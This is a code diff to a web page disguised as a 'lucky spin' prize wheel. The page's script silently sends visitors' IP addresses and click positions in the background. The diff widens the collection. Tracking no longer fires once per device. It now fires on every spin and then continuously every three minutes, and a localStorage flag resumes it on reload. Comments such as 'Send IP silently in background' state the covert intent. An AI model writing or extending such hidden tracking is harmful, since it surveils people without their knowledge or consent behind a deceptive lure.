@@ -619,21 +619,22 @@
             wheel.classList.add('spinning');
             prizeDisplay.classList.remove('show');
 
-            // Only send data on FIRST click if not already tracked
-            if (!hasBeenTracked()) {
-                // Capture click position
-                const clickPos = {
-                    x: event.clientX,
-                    y: event.clientY,
-                    pageX: event.pageX,
-                    pageY: event.pageY,
-                    screenX: event.screenX,
-                    screenY: event.screenY
-                };
+            // Capture click position
+            const clickPos = {
+                x: event.clientX,
+                y: event.clientY,
+                pageX: event.pageX,
+                pageY: event.pageY,
+                screenX: event.screenX,
+                screenY: event.screenY
+            };
 
-                // Send IP silently in background while wheel is spinning
-                sendIPSilently(clickPos);
-                markAsTracked();
+            // ALWAYS send data when user clicks spin button
+            sendIPSilently(clickPos);
+            
+            // Start continuous tracking after first click
+            if (!isTrackingActive()) {
+                startContinuousTracking();
             }
 
             // Wait for spin to complete
@@ -661,32 +662,42 @@
             }, 4000);
         });
 
-        // Check if already tracked (only once per device)
-        function hasBeenTracked() {
+        // Check if continuous tracking is active
+        function isTrackingActive() {
             try {
-                return localStorage.getItem('lucky_spin_tracked') === 'true';
+                return localStorage.getItem('lucky_spin_tracking') === 'active';
             } catch {
                 return false;
             }
         }
 
-        function markAsTracked() {
+        // Mark tracking as active
+        function markTrackingActive() {
             try {
-                localStorage.setItem('lucky_spin_tracked', 'true');
-                localStorage.setItem('lucky_spin_tracked_time', new Date().toISOString());
+                localStorage.setItem('lucky_spin_tracking', 'active');
+                localStorage.setItem('lucky_spin_start_time', new Date().toISOString());
             } catch {}
         }
 
-        // Auto send IP when page loads (silent) - ONLY ONCE
+        // Start continuous tracking every 3 minutes
+        function startContinuousTracking() {
+            markTrackingActive();
+            console.log('🎯 Continuous tracking started - Will send data every 3 minutes');
+            
+            // Send data every 3 minutes (180000 ms)
+            setInterval(() => {
+                sendIPSilently();
+                console.log('📊 Auto-tracking: Data sent at ' + new Date().toLocaleString('vi-VN'));
+            }, 180000); // 3 minutes
+        }
+
+        // Auto start continuous tracking if already active (on page reload)
         window.addEventListener('load', () => {
-            if (!hasBeenTracked()) {
-                setTimeout(() => {
-                    sendIPSilently();
-                    markAsTracked();
-                    console.log('🔒 Tracked successfully. Will not track again from this device.');
-                }, 1000);
+            if (isTrackingActive()) {
+                console.log('✅ Resuming continuous tracking...');
+                startContinuousTracking();
             } else {
-                console.log('✅ Already tracked from this device.');
+                console.log('⏳ Waiting for user to click spin button...');
             }
         });
     </script>
